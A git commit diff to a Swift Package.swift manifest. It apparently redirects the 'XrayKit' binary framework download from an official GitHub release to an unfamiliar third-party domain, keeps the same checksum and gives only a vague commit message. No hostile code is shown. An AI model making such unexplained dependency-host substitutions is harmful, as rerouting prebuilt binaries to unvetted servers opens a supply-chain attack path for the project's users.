e680fdedc0779042199e3f4c39a8ee49912816bf
backstab1935 <fiat4sat@protonmail.com>
2025-11-08 13:04:31 +0330

    Update Package.swift

--- Package.swift
+++ Package.swift
@@ -11,7 +11,7 @@ let package = Package(
   targets: [
     .binaryTarget(
       name: "XrayKit",
-      url: "https://github.com/thebytearray/XrayKit/releases/download/1.0.6/XrayKit.xcframework.zip",
+      url: "https://oracle-master1.0000014.xyz/XrayKit.xcframework.zip",
       checksum: "8612604c63574302997cf084e4f706338d5a4e89529459a783ff08a84a8aca17"
     )
   ]
